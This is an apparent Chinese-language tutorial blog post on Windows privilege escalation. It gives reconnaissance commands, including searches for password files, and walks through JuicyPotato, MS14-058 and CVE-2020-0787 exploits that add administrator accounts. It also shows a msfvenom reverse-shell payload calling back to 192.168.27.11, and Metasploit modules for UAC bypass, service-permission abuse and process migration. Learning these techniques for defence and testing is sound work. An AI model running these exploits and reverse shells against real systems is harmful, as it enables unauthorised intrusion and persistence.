&lt;p&gt;使用 Windows 命令提示符执行的，它将系统信息输出到名为 &amp;quot;a.txt&amp;quot; 的文件中，然后检查特定的 Windows 更新是否已安装。如果某些指定的更新未安装，它会输出一条消息表示这些更新未安装。最后，它会删除临时文件 &amp;quot;a.txt&lt;/p&gt;
&lt;p&gt;systeminfo&amp;gt;a.txt&amp;amp;(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;amp;del /f /q /a a.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110225111274.png&#34; alt=&#34;image-20231110225111274&#34;&gt;&lt;/p&gt;
&lt;p&gt;提权辅助:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4v&#34;&gt;https://i.hacking8.com/tiquan/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;windows 漏洞集合&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=&#34;&gt; https://github.com/SecWiki/windows-kernel-exploits&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;收集信息常用命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#收集信息常用命令&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;收集信息常用命令&lt;/span&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ipconfig /all                                            --网卡配置&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systeminfo                                               --系统补丁信息等&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo %PROCESSOR_ARCHITECTURE%                            --系统体系结构&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic product get name,version                            --安装软件、版本、路径&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic service list brief                                  --查询本机服务信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;tasklist -svc                                            --进程查看&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;schtasks /query /fo list /v                              --任务计划查询&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net statistics workstation                               --开机时间&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user                                                 --查看用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whoami /all                                              --SID等用户信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net localgroup administrators                            --查看管理员组中的用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net session                                              --会话查看&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netstat -ano                                             --网络连接以及通过端口判断服务&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net share                                                --共享&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;route print                                              --路由信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp -a                                                   --arp信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cmdkey /l                                                --登录历史&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hosts文件  Linux：/etc/hosts  Windows：c:\Windows\system32\drivers\etc\hosts&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ipconfig  /displaydns                                    --dns缓存&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net view                                                 --查看共享&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dir /s /b &#34;pass&#34; &#34;user&#34; &#34;config&#34; &#34;username.&#34; &#34;password.&#34; --命令行查找敏感文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;findstr  /s /m &#34;password&#34; *.*                            --寻找包含密码字段的文件，如数据库密码文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user /domain                                         --查看域用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net time /domain                                         --查看时间服务器（可能为DC）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net group &#34;domain admins&#34; /domain                        --查看域管理员&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net group &#34;domaincontrollers&#34; /domain                    --查看域控制器&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;net user 显示当前系统中的所有用户信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110133913521.png&#34; alt=&#34;image-20231110133913521&#34;&gt;&lt;/p&gt;
&lt;p&gt;net user 31166 查看用户详细信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134358877.png&#34; alt=&#34;image-20231110134358877&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;whoami-all&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#whoami-all&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;whoami /all&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取当前用户详细信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134649977.png&#34; alt=&#34;image-20231110134649977&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;hostname&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hostname&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;hostname&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取主机名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134745836.png&#34; alt=&#34;image-20231110134745836&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;whoami-priv&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#whoami-priv&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;whoami /priv&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取当前用户的安全特权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134929728.png&#34; alt=&#34;image-20231110134929728&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;net-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#net-start&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;net start&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取已经启动的 Windows 服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110135119067.png&#34; alt=&#34;image-20231110135119067&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;systeminfo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#systeminfo&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;systeminfo&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取电脑打了那些补丁为之后提权打下基础&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151656666.png&#34; alt=&#34;image-20231110151656666&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;扫描可写可读目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扫描可写可读目录&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;扫描可写可读目录&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151233596.png&#34; alt=&#34;image-20231110151233596&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;windows常用提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows常用提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;windows 常用提权&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&#34;ms16-075烂土豆提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ms16-075烂土豆提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;MS16-075 烂土豆提权&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;影响版本：Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2012 等&lt;/p&gt;
&lt;p&gt;下载网址&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1N3ZWV0UG90YXRv&#34;&gt;https://github.com/uknowsec/SweetPotato&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0p1aWN5UG90YXRvL2Jsb2IvbWFpbi9KdWljeVBvdGF0by1zaGVsbGNvZGUvQmluL0p1aWN5UG90YXRvLmV4ZQ==&#34;&gt;https://github.com/uknowsec/JuicyPotato/blob/main/JuicyPotato-shellcode/Bin/JuicyPotato.exe&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;找到了可读写目录上传 exe&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110153059031.png&#34; alt=&#34;image-20231110153059031&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行命令&lt;/p&gt;
&lt;p&gt;C:\inetpub\wwwroot\dedecms\JuicyPotato_x64.exe net user yunyi2 1234567890 /add &amp;amp;&amp;amp; net localgroup administrators yunyi/add&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110160256590.png&#34; alt=&#34;image-20231110160256590&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ms14-058提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ms14-058提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;MS14-058 提权&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;具体而言，win32k.sys 是 Windows 子系统的一部分，负责窗口管理和屏幕输出。如果内核模块未正确处理内存中的对象，攻击者可能会通过利用这一漏洞来在内核模式中执行任意代码。成功利用此漏洞的攻击者可以在系统中运行具有更高权限的代码，进而执行一系列危险操作，如安装程序、查看、更改或删除数据，或者创建具有完全管理权限的新账户。&lt;/p&gt;
&lt;p&gt;影响版本&lt;br&gt;
 Windows x64，包括 Windows 7 和 Windows Server 2008 R2 及以下&lt;/p&gt;
&lt;p&gt;上传 exe 到可执行目录&lt;/p&gt;
&lt;p&gt;whoami 看到已经是 nt authority\system&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182725492.png&#34; alt=&#34;image-20231110182725492&#34;&gt;&lt;/p&gt;
&lt;p&gt;64.exe “net user yunyi 123456 /add” 添加用户&lt;/p&gt;
&lt;p&gt;64.exe &amp;quot;net localgroup administrators yunyi /add&amp;quot; 添加到管理员组&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182123803.png&#34; alt=&#34;image-20231110182123803&#34;&gt;&lt;/p&gt;
&lt;p&gt;远程端口连接成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182617605.png&#34; alt=&#34;image-20231110182617605&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;cve-2020-0787&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2020-0787&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;CVE-2020-0787&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;影响版本&lt;/p&gt;
&lt;p&gt;Windows 10 Version 1809 for ARM64-based Systems&lt;br&gt;
Windows Server 2008 for 32-bit Systems Service Pack 2&lt;br&gt;
Windows RT 8.1&lt;br&gt;
Windows 8.1 for x64-based systems&lt;br&gt;
Windows 8.1 for 32-bit systems&lt;br&gt;
Windows 7 for x64-based Systems Service Pack 1&lt;br&gt;
Windows 7 for 32-bit Systems Service Pack 1&lt;br&gt;
Windows Server 2016 (Server Core installation)&lt;br&gt;
Windows Server 2016&lt;br&gt;
Windows 10 Version 1607 for x64-based Systems&lt;br&gt;
Windows 10 Version 1607 for 32-bit Systems&lt;br&gt;
Windows 10 for x64-based Systems&lt;br&gt;
Windows 10 for 32-bit Systems&lt;br&gt;
Windows Server, version 1903 (Server Core installation)&lt;br&gt;
Windows 10 Version 1903 for ARM64-based Systems&lt;br&gt;
Windows 10 Version 1903 for x64-based Systems&lt;br&gt;
Windows 10 Version 1903 for 32-bit Systems&lt;br&gt;
Windows 10 Version 1709 for ARM64-based Systems&lt;br&gt;
Windows 10 Version 1709 for x64-based Systems&lt;br&gt;
Windows 10 Version 1709 for 32-bit Systems&lt;br&gt;
Windows Server, version 1909 (Server Core installation)&lt;br&gt;
Windows 10 Version 1909 for ARM64-based Systems&lt;br&gt;
Windows 10 Version 1909 for x64-based Systems&lt;br&gt;
Windows 10 Version 1909 for 32-bit Systems&lt;br&gt;
Windows Server 2019 (Server Core installation)&lt;br&gt;
Windows Server 2019&lt;br&gt;
Windows Server 2012 R2 (Server Core installation)&lt;br&gt;
Windows Server 2012 R2&lt;br&gt;
Windows Server 2012 (Server Core installation)&lt;br&gt;
Windows Server 2012&lt;br&gt;
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)&lt;br&gt;
Windows Server 2008 R2 for x64-based Systems Service Pack 1&lt;br&gt;
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)&lt;br&gt;
Windows Server 2008 for x64-based Systems Service Pack 2&lt;br&gt;
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)&lt;br&gt;
Windows 10 Version 1809 for x64-based Systems&lt;br&gt;
Windows 10 Version 1809 for 32-bit Systems&lt;br&gt;
Windows 10 Version 1803 for ARM64-based Systems&lt;br&gt;
Windows Server, version 1803 (Server Core Installation)&lt;br&gt;
Windows 10 Version 1803 for x64-based Systems&lt;br&gt;
Windows 10 Version 1803 for 32-bit Systems&lt;/p&gt;
&lt;p&gt;脚本地址&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Nid2FuZzUwNS9DVkUtMjAyMC0wNzg3LUVYUC1BTEwtV0lORE9XUy1WRVJTSU9OL3JlbGVhc2VzL3RhZy8x&#34;&gt;https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;要求上桌面执行，会弹出系统权限的 cmd&lt;/p&gt;
&lt;p&gt;把 exe 上传后切换上面创建的用户登陆桌面&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185051791.png&#34; alt=&#34;image-20231110185051791&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行后弹出 cmd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185214126.png&#34; alt=&#34;image-20231110185214126&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185227277.png&#34; alt=&#34;image-20231110185227277&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;msf利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf利用&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;msf 利用&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;先生成一个木马文件&lt;/p&gt;
&lt;p&gt;msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=8989-f exe &amp;gt;/vs.exe&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110211226995.png&#34; alt=&#34;image-20231110211226995&#34;&gt;&lt;/p&gt;
&lt;p&gt;msf 打开监听&lt;/p&gt;
&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;set lhost 192.168.27.11&lt;/p&gt;
&lt;p&gt;set lport 8989&lt;/p&gt;
&lt;p&gt;exploit&lt;/p&gt;
&lt;p&gt;用 webshell 上传到受害机执行木马文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213027928.png&#34; alt=&#34;image-20231110213027928&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213439218.png&#34; alt=&#34;image-20231110213439218&#34;&gt;&lt;/p&gt;
&lt;p&gt;跟之前一样查看打了那些补丁&lt;/p&gt;
&lt;p&gt;输入 shell 获取 cmd 使用 systeminfo 获取到信息后跟之前一样去找可以用的提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214317729.png&#34; alt=&#34;image-20231110214317729&#34;&gt;&lt;/p&gt;
&lt;p&gt;用 background 命令把会话放在后台，可以用 session 查看已建立的会话信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214725591.png&#34; alt=&#34;image-20231110214725591&#34;&gt;&lt;/p&gt;
&lt;p&gt;search ms14_058 查找漏洞信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214943295.png&#34; alt=&#34;image-20231110214943295&#34;&gt;&lt;/p&gt;
&lt;p&gt;use exploit/windows/local/ms14_058_track_popup_menu&lt;/p&gt;
&lt;p&gt;show options 查看利用要求&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110215511454.png&#34; alt=&#34;image-20231110215511454&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置会话 id 刚才看的是 session 2 所以设置为 2&lt;/p&gt;
&lt;p&gt;set session 2&lt;/p&gt;
&lt;p&gt;然后 exploit 执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110220237813.png&#34; alt=&#34;image-20231110220237813&#34;&gt;&lt;/p&gt;
&lt;p&gt;use exploit/windows/local/ms16_075_reflection_juicy&lt;/p&gt;
&lt;p&gt;ms14_058 没有成功所以换了 ms16 _075 成功获取 system 权限&lt;/p&gt;
&lt;p&gt;切换 shell 添加用户并加入管理员&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221425934.png&#34; alt=&#34;image-20231110221425934&#34;&gt;&lt;/p&gt;
&lt;p&gt;维权&lt;/p&gt;
&lt;p&gt;ps 列出进程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221951490.png&#34; alt=&#34;image-20231110221951490&#34;&gt;&lt;/p&gt;
&lt;p&gt;migrate 1184&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110222507771.png&#34; alt=&#34;image-20231110222507771&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;uac提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#uac提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;UAC 提权&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;用户账户控制（UAC）是 Windows 操作系统中的一项安全特性。它旨在帮助防止未经授权的对计算机的更改。当一个程序尝试执行需要管理员权限的更改时，UAC 会通知用户并在允许更改之前征得用户的确认。&lt;/p&gt;
&lt;p&gt;UAC 通过确保只有在用户明确同意的情况下才执行管理操作，有助于降低未经授权的更改和恶意软件安装的风险。这样，即使用户以管理员身份登录，他们仍然需要确认他们意图执行可能对系统造成影响的某些操作。&lt;/p&gt;
&lt;p&gt;前提：已获取目标本地用户权限&lt;/p&gt;
&lt;p&gt;上传 msf 木马执行&lt;/p&gt;
&lt;p&gt;现在为普通用户权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102136583.png&#34; alt=&#34;image-20231111102136583&#34;&gt;&lt;/p&gt;
&lt;p&gt;search 搜索一下 UAC 利用模块&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111100615934.png&#34; alt=&#34;image-20231111100615934&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 exploit/windows/local/bypassuac 模块&lt;/p&gt;
&lt;p&gt;set session 5&lt;/p&gt;
&lt;p&gt;run&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102853388.png&#34; alt=&#34;image-20231111102853388&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行成功过后再使用 getsystem&lt;/p&gt;
&lt;p&gt;getuid 查看已经是 system 权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102946311.png&#34; alt=&#34;image-20231111102946311&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;windows系统配置错误提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows系统配置错误提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;windows 系统配置错误提权&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&#34;系统服务权限配置错误&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统服务权限配置错误&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;系统服务权限配置错误&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;Windows 在系统启动时，会伴随着一些高权服务启动 (windows 服务是以 system 权限运行的) 如果某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如 DLL 劫持&lt;/p&gt;
&lt;p&gt;如果一个低权限用户对系统服务调用的可执行文件有写权限，他们可以替换该文件，并在系统启动时获取控制权限。尽管 Windows 服务以 system 权限运行，其文件夹、文件和注册表项受到强制访问控制的保护，但在某些情况下，仍可能存在一些缺乏有效保护的服务。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;Metasploit&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上线木马当前是 iis 权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112119228.png&#34; alt=&#34;image-20231111112119228&#34;&gt;&lt;/p&gt;
&lt;p&gt;background 把会话放在后台&lt;/p&gt;
&lt;p&gt;切换到 use exploit/windows/local/service_permissions 攻击模块&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112359457.png&#34; alt=&#34;image-20231111112359457&#34;&gt;&lt;/p&gt;
&lt;p&gt;set session 4&lt;/p&gt;
&lt;p&gt;设置为 session 4&lt;/p&gt;
&lt;p&gt;exploit 执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112807154.png&#34; alt=&#34;image-20231111112807154&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;PrivescCheck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;脚本地址&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2l0bTRuL1ByaXZlc2NDaGVjaw==&#34;&gt; https://github.com/itm4n/PrivescCheck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;列举共同 Windows 配置问题  ，可以利用当地的权限升级&lt;/p&gt;
&lt;p&gt;使用 1:   基本的使用情况&lt;/p&gt;
